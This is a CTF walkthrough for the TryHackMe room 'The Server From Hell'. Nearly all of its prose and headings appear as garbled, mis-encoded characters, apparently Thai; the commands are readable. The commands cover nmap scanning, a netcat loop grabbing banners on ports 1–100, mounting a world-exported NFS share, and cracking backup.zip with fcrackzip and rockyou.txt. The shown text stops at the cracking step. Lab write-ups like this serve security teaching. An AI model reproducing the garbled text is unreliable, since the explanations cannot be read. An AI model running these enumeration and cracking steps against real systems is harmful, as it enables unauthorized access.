### ‚ú® ‡∏ö‡∏ó‡∏ô‡∏≥
The Server From Hell ‡πÄ‡∏õ‡πá‡∏ô‡∏´‡πâ‡∏≠‡∏á CTF ‡∏™‡∏≤‡∏¢ Linux ‡∏ö‡∏ô TryHackMe ‡∏ó‡∏µ‡πà‡πÄ‡∏ô‡πâ‡∏ô‡∏Å‡∏≤‡∏£‡πÄ‡∏à‡∏≤‡∏∞‡∏£‡∏∞‡∏ö‡∏ö‡∏ï‡∏±‡πâ‡∏á‡πÅ‡∏ï‡πà‡∏Å‡∏≤‡∏£ enumerate ‡∏û‡∏≠‡∏£‡πå‡∏ï‡∏ã‡πà‡∏≠‡∏ô, ‡πÄ‡∏à‡∏≠ misconfigured NFS share, crack ‡πÑ‡∏ü‡∏•‡πå zip, ‡πÉ‡∏ä‡πâ SSH key ‡πÄ‡∏Ç‡πâ‡∏≤‡πÄ‡∏Ñ‡∏£‡∏∑‡πà‡∏≠‡∏á ‡πÅ‡∏•‡∏∞‡∏¢‡∏Å‡∏£‡∏∞‡∏î‡∏±‡∏ö‡∏™‡∏¥‡∏ó‡∏ò‡∏¥‡πå‡∏î‡πâ‡∏ß‡∏¢ Linux capabilities ‡∏à‡∏ô‡πÑ‡∏î‡πâ root shell

## üéØ ‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢
- ‡∏´‡∏≤‡∏û‡∏≠‡∏£‡πå‡∏ï/‡∏ö‡∏£‡∏¥‡∏Å‡∏≤‡∏£‡∏ó‡∏µ‡πà ‚Äú‡∏ã‡πà‡∏≠‡∏ô‚Äù ‡πÑ‡∏ß‡πâ‡πÅ‡∏•‡∏∞‡∏¢‡∏∑‡∏ô‡∏¢‡∏±‡∏ô‡∏û‡∏§‡∏ï‡∏¥‡∏Å‡∏£‡∏£‡∏°‡∏î‡πâ‡∏ß‡∏¢ `nc`
- ‡πÉ‡∏ä‡πâ **NFS (2049/tcp)** ‡∏ó‡∏µ‡πà misconfigured ‡πÄ‡∏û‡∏∑‡πà‡∏≠ ‚Äú‡∏î‡∏∂‡∏á‡∏Å‡∏∏‡∏ç‡πÅ‡∏à SSH‚Äù ‡∏Ç‡∏≠‡∏á‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ
- ‡∏´‡∏•‡∏ö‡∏≠‡∏≠‡∏Å‡∏à‡∏≤‡∏Å **IRB (Interactive Ruby)** ‡πÑ‡∏õ‡πÄ‡∏õ‡πá‡∏ô‡πÄ‡∏ä‡∏•‡∏•‡πå‡∏à‡∏£‡∏¥‡∏á
- ‡πÉ‡∏ä‡πâ **capabilities ‡∏Ç‡∏≠‡∏á /bin/tar** ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏≠‡πà‡∏≤‡∏ô‡πÑ‡∏ü‡∏•‡πå‡∏ï‡πâ‡∏≠‡∏á‡∏´‡πâ‡∏≤‡∏° ‚Üí ‡πÑ‡∏î‡πâ hash ‡∏Ç‡∏≠‡∏á root
- Crack hash ‡∏à‡∏ô‡πÑ‡∏î‡πâ‡∏£‡∏´‡∏±‡∏™‡∏ú‡πà‡∏≤‡∏ô ‚Üí `su root` ‡πÅ‡∏•‡∏∞‡πÄ‡∏Å‡πá‡∏ö flag

# üß† TryHackMe - The Server From Hell

üü° ‡∏´‡∏°‡∏ß‡∏î: CTF / Boot-to-Root  
üß© ‡∏Ñ‡∏ß‡∏≤‡∏°‡∏¢‡∏≤‡∏Å: Medium
üïµÔ∏è‚Äç‚ôÇÔ∏è ‡πÇ‡∏´‡∏°‡∏î: CTF ‡πÅ‡∏ö‡∏ö Boot-to-Root
üß© URL: The Server From Hell
üë®‚Äçüíª ‡∏ú‡∏π‡πâ‡∏ó‡∏≥: Thanyakorn

---

## üìö ‡∏™‡∏≤‡∏£‡∏ö‡∏±‡∏ç (Table of Contents)

- üìå ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏≤‡∏Å‡πÇ‡∏à‡∏ó‡∏¢‡πå
- üîé 1) Recon & Port Scan
- üì° 2) ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö Banner ‡πÅ‡∏•‡∏∞ Web Services
- üåê 3) ‡∏™‡πÅ‡∏Å‡∏ô‡∏û‡∏≠‡∏£‡πå‡∏ï 1‚Äì100 ‡∏ï‡∏≤‡∏° Hint
  - üåê 3.1) ‡∏™‡πÅ‡∏Å‡∏ô‡∏û‡∏≠‡∏£‡πå‡∏ï 1‚Äì100 ‡∏≠‡∏±‡∏ï‡πÇ‡∏ô‡∏°‡∏±‡∏ï‡∏¥ (Netcat Script)
  - üåê 3.2) ‡∏û‡∏ö‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡∏ä‡∏µ‡πâ‡∏û‡∏≠‡∏£‡πå‡∏ï‡∏à‡∏≤‡∏Å‡∏Å‡∏≤‡∏£‡∏£‡∏±‡∏ô‡∏™‡∏Ñ‡∏£‡∏¥‡∏õ‡∏ï‡πå
- üìÇ 4) ‡∏ï‡∏£‡∏ß‡∏à‡∏´‡∏≤‡πÅ‡∏•‡∏∞‡πÄ‡∏°‡∏≤‡∏ô‡∏ï‡πå NFS Share
- üîé 5) ‡∏û‡∏ö backup.zip ‚Üí ‡πÅ‡∏ï‡∏Å‡πÑ‡∏ü‡∏•‡πå‡∏î‡πâ‡∏ß‡∏¢‡∏£‡∏´‡∏±‡∏™‡∏à‡∏≤‡∏Å Wordlist
- üìÇ 6) ‡∏Ç‡∏±‡πâ‡∏ô‡∏ï‡∏≠‡∏ô‡∏ñ‡∏±‡∏î‡πÑ‡∏õ‡∏´‡∏•‡∏±‡∏á‡πÅ‡∏ï‡∏Å backup.zip
- üîë 7) ‡∏ó‡∏î‡∏•‡∏≠‡∏á‡πÄ‡∏Ç‡πâ‡∏≤ SSH (‡∏ï‡∏≤‡∏° Hint: 2500‚Äì4500)
- üîì 8) ‡∏´‡∏•‡∏∏‡∏î‡∏à‡∏≤‡∏Å IRB ‚Üí ‡πÑ‡∏î‡πâ Shell ‡∏à‡∏£‡∏¥‡∏á (Bash)
- üß≠ 9) ‡πÉ‡∏ä‡πâ tar (cap_dac_read_search) ‡∏î‡∏∂‡∏á‡πÑ‡∏ü‡∏•‡πå‡∏Ç‡∏≠‡∏á root
  - ü™Ñ ‡∏ï‡∏£‡∏ß‡∏à‡∏´‡∏≤ Linux Capabilities
  - üìÇ ‡∏™‡∏£‡πâ‡∏≤‡∏á‡πÅ‡∏•‡∏∞‡πÅ‡∏ï‡∏Å archive ‡∏Ç‡∏≠‡∏á /root
  - üèÅ ‡∏≠‡πà‡∏≤‡∏ô Root Flag
- ‚öôÔ∏è ‡∏ó‡∏≤‡∏á‡πÄ‡∏•‡∏∑‡∏≠‡∏Å‡∏ó‡∏µ‡πà 2 ‚Äî ‡∏î‡∏∂‡∏á /etc/shadow ‡πÅ‡∏•‡πâ‡∏ß crack ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡πÄ‡∏õ‡πá‡∏ô root

---

## üìå ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏≤‡∏Å‡πÇ‡∏à‡∏ó‡∏¢‡πå
> ‚ÄúStart at port 1337 and enumerate your way. Good luck.‚Äù

## üîç 1. Recon & Port Scan
‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏à‡∏≤‡∏Å‡∏•‡∏≠‡∏á‡πÉ‡∏ä‡πâ‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á:
```bash
nmap -sC -sV -Pn <TARGET_IP>
```
- `-sC` ‚Üí ‡∏£‡∏±‡∏ô Nmap Default Scripts (NSE) ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏´‡∏≤‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏•‡∏∂‡∏Å ‡πÄ‡∏ä‡πà‡∏ô SSL cert, FTP anon, SSH key fingerprint
- `-sV` ‚Üí ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡πÄ‡∏ß‡∏≠‡∏£‡πå‡∏ä‡∏±‡∏ô service
- `-Pn` ‚Üí ‡∏Å‡∏≤‡∏£‡∏ó‡∏î‡∏™‡∏≠‡∏ö service ‡πÅ‡∏°‡πâ‡πÑ‡∏°‡πà‡∏£‡∏π‡πâ‡∏ß‡πà‡∏≤ host ‡∏≠‡∏≠‡∏ô‡πÑ‡∏•‡∏ô‡πå‡∏´‡∏£‡∏∑‡∏≠‡πÑ‡∏°‡πà

‚ùå ‡∏õ‡∏±‡∏ç‡∏´‡∏≤: ‡∏Å‡∏≤‡∏£‡πÉ‡∏ä‡πâ -sC ‡∏à‡∏∞‡∏ó‡∏≥‡πÉ‡∏´‡πâ Nmap ‡πÄ‡∏£‡∏µ‡∏¢‡∏Å‡πÉ‡∏ä‡πâ script ‡πÄ‡∏¢‡∏≠‡∏∞‡∏°‡∏≤‡∏Å ‚Üí ‡πÅ‡∏ï‡πà‡∏•‡∏∞ script ‡∏ï‡πâ‡∏≠‡∏á‡∏£‡∏≠ response ‡∏´‡∏£‡∏∑‡∏≠ timeout ‡∏à‡∏≤‡∏Å service ‚Üí ‡∏ó‡∏≥‡πÉ‡∏´‡πâ **‡∏™‡πÅ‡∏Å‡∏ô‡∏ä‡πâ‡∏≤** ‡πÇ‡∏î‡∏¢‡πÄ‡∏â‡∏û‡∏≤‡∏∞‡∏ñ‡πâ‡∏≤‡πÄ‡∏à‡∏≠‡∏û‡∏≠‡∏£‡πå‡∏ï‡πÄ‡∏õ‡∏¥‡∏î‡∏´‡∏•‡∏≤‡∏¢‡∏ï‡∏±‡∏ß

‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏°‡∏£‡∏ß‡∏î‡πÄ‡∏£‡πá‡∏ß‡πÉ‡∏ä‡πâ‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á:
```bash
nmap -sV -vv <TARGET_IP>
```
![nmap](images/1.png)

- ‡∏ï‡∏±‡∏î `-sC` ‡∏≠‡∏≠‡∏Å ‚Üí ‡πÑ‡∏°‡πà‡∏ï‡πâ‡∏≠‡∏á‡∏£‡∏±‡∏ô NSE scripts ‚Üí scan ‡πÑ‡∏ß‡∏Å‡∏ß‡πà‡∏≤
- ‡πÉ‡∏ä‡πâ `-sV` ‡πÄ‡∏û‡∏µ‡∏¢‡∏á‡∏≠‡∏¢‡πà‡∏≤‡∏á‡πÄ‡∏î‡∏µ‡∏¢‡∏ß ‚Üí ‡πÄ‡∏ô‡πâ‡∏ô‡∏î‡∏π service ‡πÅ‡∏•‡∏∞ version
- ‡πÄ‡∏û‡∏¥‡πà‡∏° `-vv` (very verbose) ‚Üí ‡πÉ‡∏´‡πâ Nmap ‡∏£‡∏≤‡∏¢‡∏á‡∏≤‡∏ô‡∏ú‡∏•‡∏ó‡∏µ‡∏•‡∏∞‡∏û‡∏≠‡∏£‡πå‡∏ï‡πÅ‡∏ö‡∏ö realtime ‡∏ó‡∏≥‡πÉ‡∏´‡πâ‡πÄ‡∏´‡πá‡∏ô‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå ‚Äú‡πÄ‡∏£‡πá‡∏ß‡∏Ç‡∏∂‡πâ‡∏ô‚Äù ‡∏ñ‡∏∂‡∏á‡πÅ‡∏°‡πâ‡πÄ‡∏ö‡∏∑‡πâ‡∏≠‡∏á‡∏´‡∏•‡∏±‡∏á‡∏¢‡∏±‡∏á‡∏™‡πÅ‡∏Å‡∏ô‡∏≠‡∏¢‡∏π‡πà

‚úÖ ‡πÅ‡∏ö‡∏ö‡∏ô‡∏µ‡πâ‡πÄ‡∏£‡∏≤‡∏à‡∏∞‡πÑ‡∏î‡πâ ‡∏û‡∏≠‡∏£‡πå‡∏ï‡πÄ‡∏õ‡∏¥‡∏î + service ‡∏ó‡∏µ‡πà‡∏£‡∏±‡∏ô‡∏≠‡∏¢‡∏π‡πà ‡πÄ‡∏£‡πá‡∏ß‡∏û‡∏≠‡∏ó‡∏µ‡πà‡∏à‡∏∞‡∏ô‡∏≥‡πÑ‡∏õ‡∏ó‡∏≥ banner grabbing/manual test ‡∏ï‡πà‡∏≠ ‡πÄ‡∏ä‡πà‡∏ô ‡πÉ‡∏ä‡πâ nc

### ‚ÑπÔ∏è ‡∏ß‡∏¥‡πÄ‡∏Ñ‡∏£‡∏≤‡∏∞‡∏´‡πå‡∏ú‡∏•‡∏Å‡∏≤‡∏£‡∏™‡πÅ‡∏Å‡∏ô
‡∏à‡∏≤‡∏Å‡∏Å‡∏≤‡∏£‡∏™‡πÅ‡∏Å‡∏ô‡∏û‡∏ö‡∏ß‡πà‡∏≤‡∏°‡∏µ‡∏û‡∏≠‡∏£‡πå‡∏ï‡πÄ‡∏õ‡∏¥‡∏î‡∏à‡∏≥‡∏ô‡∏ß‡∏ô‡∏°‡∏≤‡∏Å (20+ ‡∏û‡∏≠‡∏£‡πå‡∏ï) ‡∏ô‡∏≠‡∏Å‡∏à‡∏≤‡∏Å‡∏ô‡∏µ‡πâ‡∏¢‡∏±‡∏á‡∏°‡∏µ‡∏û‡∏≠‡∏£‡πå‡∏ï‡πÅ‡∏õ‡∏•‡∏Å ‡πÜ ‡πÄ‡∏ä‡πà‡∏ô `10628`, `16000`, `2607`, `5001` ‡∏ã‡∏∂‡πà‡∏á‡∏≠‡∏≤‡∏à‡πÄ‡∏õ‡πá‡∏ô service ‡∏û‡∏¥‡πÄ‡∏®‡∏©‡∏´‡∏£‡∏∑‡∏≠ **honeyport** ‡∏ó‡∏µ‡πà‡∏ï‡∏±‡πâ‡∏á‡πÉ‡∏à‡πÄ‡∏õ‡∏¥‡∏î‡πÑ‡∏ß‡πâ‡πÉ‡∏ô CTF ‡∏´‡∏£‡∏∑‡∏≠‡∏ß‡∏≤‡∏á‡πÑ‡∏ß‡πâ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏´‡∏•‡∏≠‡∏Å

## üì° 2. ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö Banner ‡πÅ‡∏•‡∏∞ Web Services
> ‚ÄúStart at port 1337 and enumerate your way. Good luck.‚Äù

‡∏à‡∏∂‡∏á‡∏•‡∏≠‡∏á‡πÉ‡∏ä‡πâ nc ‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠‡πÑ‡∏õ‡∏ó‡∏µ‡πà‡∏û‡∏≠‡∏£‡πå‡∏ï 1337:
```bash
nc <TARGET_IP> 1337
```

![nc](images/2.png)

‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå‡∏ó‡∏µ‡πà‡πÑ‡∏î‡πâ:
```text
Welcome traveller, to the beginning of your journey
To begin, find the trollface
Legend says he's hiding in the first 100 ports
Try printing the banners from the ports
```

üìå ‡∏à‡∏≤‡∏Å‡∏Ç‡πâ‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏°‡∏ô‡∏µ‡πâ ‡∏™‡∏£‡∏∏‡∏õ‡πÑ‡∏î‡πâ‡∏ß‡πà‡∏≤‡πÄ‡∏£‡∏≤‡∏ï‡πâ‡∏≠‡∏á **‡∏™‡πÅ‡∏Å‡∏ô‡∏´‡∏≤‡∏û‡∏≠‡∏£‡πå‡∏ï** (1‚Äì100) ‡πÅ‡∏•‡∏∞‡∏•‡∏≠‡∏á ‡∏î‡∏∂‡∏á banner ‡∏à‡∏≤‡∏Å‡∏û‡∏≠‡∏£‡πå‡∏ï‡πÄ‡∏´‡∏•‡πà‡∏≤‡∏ô‡∏±‡πâ‡∏ô ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏´‡∏≤‡∏ß‡πà‡∏≤ ‚Äútrollface‚Äù ‡∏ã‡πà‡∏≠‡∏ô‡∏≠‡∏¢‡∏π‡πà‡∏ï‡∏£‡∏á‡πÑ‡∏´‡∏ô

## üåê 3. ‡∏™‡πÅ‡∏Å‡∏ô‡∏û‡∏≠‡∏£‡πå‡∏ï 1‚Äì100 ‡∏ï‡∏≤‡∏° Hint
‡∏´‡∏•‡∏±‡∏á‡∏à‡∏≤‡∏Å‡πÑ‡∏î‡πâ‡∏£‡∏±‡∏ö hint ‡∏à‡∏≤‡∏Å port 1337 ‡πÉ‡∏ä‡πâ `nc` ‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠‡πÑ‡∏õ‡∏ó‡∏µ‡πà‡∏û‡∏≠‡∏£‡πå‡∏ï 1‚Äì100 ‡∏ó‡∏µ‡∏•‡∏∞‡∏ï‡∏±‡∏ß ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏î‡∏π‡∏ß‡πà‡∏≤‡∏°‡∏µ‡∏û‡∏≠‡∏£‡πå‡∏ï‡πÑ‡∏´‡∏ô‡∏ó‡∏µ‡πà‡∏ï‡∏≠‡∏ö‡∏Å‡∏•‡∏±‡∏ö‡∏Ç‡πâ‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏°‡πÅ‡∏õ‡∏•‡∏Å ‡πÜ ‡∏´‡∏£‡∏∑‡∏≠‡πÑ‡∏°‡πà

üì• ‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡∏ó‡∏µ‡πà‡πÉ‡∏ä‡πâ
```bash
nc <TARGET_IP> 1
nc <TARGET_IP> 2
nc <TARGET_IP> 3
nc <TARGET_IP> 4
```

![nc](images/3.png)

üìä ‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå
‡∏ó‡∏∏‡∏Å‡∏û‡∏≠‡∏£‡πå‡∏ï‡∏ó‡∏µ‡πà‡∏•‡∏≠‡∏á (1‚Äì4 ‡∏ï‡∏≤‡∏°‡∏£‡∏π‡∏õ) ‡∏ï‡∏≠‡∏ö‡∏Å‡∏•‡∏±‡∏ö‡∏°‡∏≤‡∏•‡∏±‡∏Å‡∏©‡∏ì‡∏∞‡πÄ‡∏î‡∏µ‡∏¢‡∏ß‡∏Å‡∏±‡∏ô:
```text
550 12345 00000000000000000000000000000000000000000000000000000000000000000000000000000000
```

üìå ‡∏´‡∏°‡∏≤‡∏¢‡∏Ñ‡∏ß‡∏≤‡∏°‡∏ß‡πà‡∏≤‡∏ï‡πâ‡∏≠‡∏á‡∏ó‡∏≥ enumeration **‡∏Ñ‡∏£‡∏ö‡∏ó‡∏∏‡∏Å‡∏û‡∏≠‡∏£‡πå‡∏ï‡πÉ‡∏ô‡∏ä‡πà‡∏ß‡∏á** 1‚Äì100 ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏ï‡∏≤‡∏°‡∏´‡∏≤‡∏û‡∏≠‡∏£‡πå‡∏ï‡∏ó‡∏µ‡πà‡∏ã‡πà‡∏≠‡∏ô‡∏Ç‡πâ‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏°‡∏û‡∏¥‡πÄ‡∏®‡∏© (‚Äútrollface‚Äù)

## üåê 3.1 ‡∏™‡πÅ‡∏Å‡∏ô‡∏û‡∏≠‡∏£‡πå‡∏ï 1‚Äì100 ‡∏≠‡∏±‡∏ï‡πÇ‡∏ô‡∏°‡∏±‡∏ï‡∏¥ (Netcat script)
‡πÑ‡∏ü‡∏•‡πå‡∏™‡∏Ñ‡∏£‡∏¥‡∏õ‡∏ï‡πå Netcat.sh:
```bash
for i in {1..100}
do
  nc 10.201.52.151 $i
  echo "\n"
done
```
‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡∏£‡∏±‡∏ô:
```bash
bash Netcat.sh
```

![nc](images/4.png)

‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå: ‡πÅ‡∏™‡∏î‡∏á banner/response ‡∏Ç‡∏≠‡∏á‡πÅ‡∏ï‡πà‡∏•‡∏∞‡∏û‡∏≠‡∏£‡πå‡∏ï 1‚Äì100 ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏Ñ‡πâ‡∏ô‡∏´‡∏≤ message ‡∏ó‡∏µ‡πà‡∏ã‡πà‡∏≠‡∏ô‡∏≠‡∏¢‡∏π‡πà‡∏ï‡∏≤‡∏° hint

## üåê 3.2 ‡∏û‡∏ö‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡∏ä‡∏µ‡πâ‡∏û‡∏≠‡∏£‡πå‡∏ï‡∏à‡∏≤‡∏Å‡∏Å‡∏≤‡∏£‡∏£‡∏±‡∏ô‡∏™‡∏Ñ‡∏£‡∏¥‡∏õ‡∏ï‡πå
‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå‡∏ö‡∏≤‡∏á‡∏™‡πà‡∏ß‡∏ô (banner ‡∏ó‡∏µ‡πà‡πÄ‡∏î‡πà‡∏ô):
```bash
... go to port 12345 ...
```

‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠‡πÑ‡∏õ‡∏ó‡∏µ‡πà‡∏û‡∏≠‡∏£‡πå‡∏ï 12345:
```bash
nc 10.201.52.151 12345
```

![nc](images/5.png)

‡πÑ‡∏î‡πâ‡∏Ç‡πâ‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏°:
```text
NFS shares are cool, especially when they are misconfigured
It's on the standard port, no need for another scan
```

üìå ‡∏Ç‡πâ‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏°‡∏ô‡∏µ‡πâ‡∏ô‡πà‡∏≤‡∏à‡∏∞‡∏™‡∏∑‡πà‡∏≠‡∏ñ‡∏∂‡∏á
- ‡∏°‡∏µ NFS (Network File System) ‡∏£‡∏±‡∏ô‡∏≠‡∏¢‡∏π‡πà
- ‡∏ô‡πà‡∏≤‡∏à‡∏∞‡∏°‡∏µ‡∏Å‡∏≤‡∏£‡πÅ‡∏ä‡∏£‡πå‡πÑ‡∏ü‡∏•‡πå/‡πÑ‡∏î‡πÄ‡∏£‡∏Å‡∏ó‡∏≠‡∏£‡∏µ‡∏ö‡∏ô‡πÄ‡∏Ñ‡∏£‡∏∑‡πà‡∏≠‡∏á‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢
- ‡∏Å‡∏≤‡∏£‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤‡∏≠‡∏≤‡∏à‡πÑ‡∏°‡πà‡∏£‡∏±‡∏î‡∏Å‡∏∏‡∏° (misconfigured) ‚Äî ‡∏´‡∏°‡∏≤‡∏¢‡∏Ñ‡∏ß‡∏≤‡∏°‡∏ß‡πà‡∏≤ share ‡∏≠‡∏≤‡∏à‡∏≠‡∏ô‡∏∏‡∏ç‡∏≤‡∏ï‡∏Å‡∏≤‡∏£‡∏≠‡πà‡∏≤‡∏ô/‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô ‡∏´‡∏£‡∏∑‡∏≠‡∏≠‡∏ô‡∏∏‡∏ç‡∏≤‡∏ï‡πÉ‡∏´‡πâ mount ‡πÑ‡∏î‡πâ‡πÇ‡∏î‡∏¢‡πÑ‡∏°‡πà‡∏ï‡πâ‡∏≠‡∏á‡∏û‡∏¥‡∏™‡∏π‡∏à‡∏ô‡πå‡∏ï‡∏±‡∏ß‡∏ï‡∏ô
- ‡∏°‡∏±‡∏ô‡∏£‡∏±‡∏ô‡∏ö‡∏ô‡∏û‡∏≠‡∏£‡πå‡∏ï‡∏°‡∏≤‡∏ï‡∏£‡∏ê‡∏≤‡∏ô (2049) ‡∏î‡∏±‡∏á‡∏ô‡∏±‡πâ‡∏ô‡πÑ‡∏°‡πà‡∏ï‡πâ‡∏≠‡∏á‡∏™‡πÅ‡∏Å‡∏ô‡∏û‡∏≠‡∏£‡πå‡∏ï‡∏≠‡∏∑‡πà‡∏ô ‚Äî ‚Äúno need for another scan‚Äù

## üìÇ 4. ‡∏ï‡∏£‡∏ß‡∏à‡∏´‡∏≤‡πÅ‡∏•‡∏∞‡πÄ‡∏°‡∏≤‡∏ô‡∏ï‡πå NFS share

1) ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö NFS export
‡∏£‡∏±‡∏ô‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á:
```bash
showmount -e 10.201.52.151
```
- showmount ‚Üí ‡πÉ‡∏ä‡πâ‡∏î‡∏π‡∏ß‡πà‡∏≤‡πÄ‡∏Ñ‡∏£‡∏∑‡πà‡∏≠‡∏á‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢ export directory ‡∏≠‡∏∞‡πÑ‡∏£‡∏≠‡∏≠‡∏Å‡∏°‡∏≤
- `-e` ‚Üí ‡πÅ‡∏™‡∏î‡∏á export list (directories ‡∏ó‡∏µ‡πà‡πÄ‡∏õ‡∏¥‡∏î‡πÉ‡∏´‡πâ mount ‡πÑ‡∏î‡πâ)
- 
![showmount](images/6.png)

‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå:
```text
Export list for 10.201.52.151:
/home/nfs *
```
‡∏Ñ‡∏ß‡∏≤‡∏°‡∏´‡∏°‡∏≤‡∏¢: /home/nfs ‡∏ñ‡∏π‡∏Å export ‡πÉ‡∏´‡πâ‡∏ó‡∏∏‡∏Å‡πÇ‡∏Æ‡∏™‡∏ï‡πå (*) ‚Äî ‡πÄ‡∏õ‡πá‡∏ô‡∏Å‡∏≤‡∏£‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤‡∏ó‡∏µ‡πà‡πÄ‡∏õ‡∏¥‡∏î‡∏Å‡∏ß‡πâ‡∏≤‡∏á (potentially misconfigured).

2) ‡∏™‡∏£‡πâ‡∏≤‡∏á‡πÇ‡∏ü‡∏•‡πÄ‡∏î‡∏≠‡∏£‡πå‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö mount
```bash
mkdir mount
```
- mkdir ‚Üí ‡∏™‡∏£‡πâ‡∏≤‡∏á‡πÇ‡∏ü‡∏•‡πÄ‡∏î‡∏≠‡∏£‡πå‡πÉ‡∏´‡∏°‡πà
- ‡πÉ‡∏ä‡πâ‡πÇ‡∏ü‡∏•‡πÄ‡∏î‡∏≠‡∏£‡πå‡∏ô‡∏µ‡πâ‡πÄ‡∏õ‡πá‡∏ô‡∏à‡∏∏‡∏î mount (mount point) ‡∏Ç‡∏≠‡∏á NFS share
  
3) ‡πÄ‡∏°‡∏≤‡∏ô‡∏ï‡πå NFS share
‡πÄ‡∏°‡∏≤‡∏ô‡∏ï‡πå share ‡πÑ‡∏õ‡∏¢‡∏±‡∏á‡πÇ‡∏ü‡∏•‡πÄ‡∏î‡∏≠‡∏£‡πå mount:
```bash
mount 10.201.52.151:/home/nfs mount
```
- mount ‚Üí ‡πÉ‡∏ä‡πâ‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠ directory ‡∏à‡∏≤‡∏Å‡πÄ‡∏Ñ‡∏£‡∏∑‡πà‡∏≠‡∏á‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢‡πÄ‡∏Ç‡πâ‡∏≤‡∏Å‡∏±‡∏ö‡πÄ‡∏Ñ‡∏£‡∏∑‡πà‡∏≠‡∏á‡πÄ‡∏£‡∏≤
- `10.201.52.151:/home/nfs` ‚Üí path ‡∏Ç‡∏≠‡∏á NFS share ‡∏ó‡∏µ‡πà‡∏à‡∏∞ mount
- `mount` ‚Üí ‡∏Ñ‡∏∑‡∏≠ local directory ‡∏ó‡∏µ‡πà‡∏™‡∏£‡πâ‡∏≤‡∏á‡πÑ‡∏ß‡πâ‡πÉ‡∏ô‡∏Ç‡∏±‡πâ‡∏ô‡∏ï‡∏≠‡∏ô‡∏Å‡πà‡∏≠‡∏ô‡∏´‡∏ô‡πâ‡∏≤

4) ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡πÑ‡∏ü‡∏•‡πå‡πÉ‡∏ô share

![share](images/7.png)

- ls -la ‚Üí ‡πÅ‡∏™‡∏î‡∏á‡πÑ‡∏ü‡∏•‡πå‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î ‡∏£‡∏ß‡∏°‡∏ñ‡∏∂‡∏á hidden files ‡∏û‡∏£‡πâ‡∏≠‡∏° permission

## üîé ‡∏û‡∏ö backup.zip ‚Üí ‡πÅ‡∏ï‡∏Å‡πÑ‡∏ü‡∏•‡πå‡∏î‡πâ‡∏ß‡∏¢‡∏£‡∏´‡∏±‡∏™‡∏à‡∏≤‡∏Å wordlist

1. ‡πÉ‡∏ä‡πâ fcrackzip ‡∏ó‡∏≥ dictionary attack ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏´‡∏≤ password ‡∏Ç‡∏≠‡∏á backup.zip

```bash
fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt backup.zip
```

![fcrackzip](images/8.png)

- `-v` : verbose (‡πÅ‡∏™‡∏î‡∏á‡∏ú‡∏•‡∏•‡∏∞‡πÄ‡∏≠‡∏µ‡∏¢‡∏î)
- `-u` : use unzip test (‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡πÅ‡∏ï‡∏Å‡∏à‡∏£‡∏¥‡∏á‡πÄ‡∏´‡∏°‡∏∑‡∏≠‡∏ô unzip)
- `-D` : dictionary mode
- `-p /path/to/wordlist` : ‡∏£‡∏∞‡∏ö‡∏∏‡πÑ‡∏ü‡∏•‡πå wordlist (‡∏ó‡∏µ‡πà‡∏ô‡∏µ‡πà‡πÉ‡∏ä‡πâ rockyou.txt)

